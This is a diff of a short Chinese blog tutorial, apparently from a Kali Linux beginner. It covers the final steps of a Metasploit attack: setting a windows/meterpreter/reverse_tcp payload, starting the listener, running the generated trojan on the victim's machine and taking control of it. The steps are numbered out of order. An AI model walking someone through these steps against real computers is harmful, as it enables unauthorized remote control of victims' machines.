@@ -12,4 +12,7 @@
 8. 输入set payload windows/meterpreter/reverse_tcp<br/>
 8. 输入exploit,开始监听[![H1oTeS.png](https://s4.ax1x.com/2022/02/08/H1oTeS.png)](https://imgtu.com/i/H1oTeS)<br/>
 6. 在被攻击方运行木马,通常,它在{攻击方IP地址/生成病毒名称,如果没有重命名的话,应该叫virus.exe}<br/>
-7. 这时,你拿到了权限,可以控制对方电脑啦~~~
+7. 这时,你拿到了权限,可以控制对方电脑啦~~~~<br/>
+
+
+PS:其实这个测试在我刚接触Kali的的时候就做过了,但是现在才想起来,于是写了个博客(顺带一提要设置的payload好难记啊啊啊啊啊啊啊啊啊啊啊啊啊)
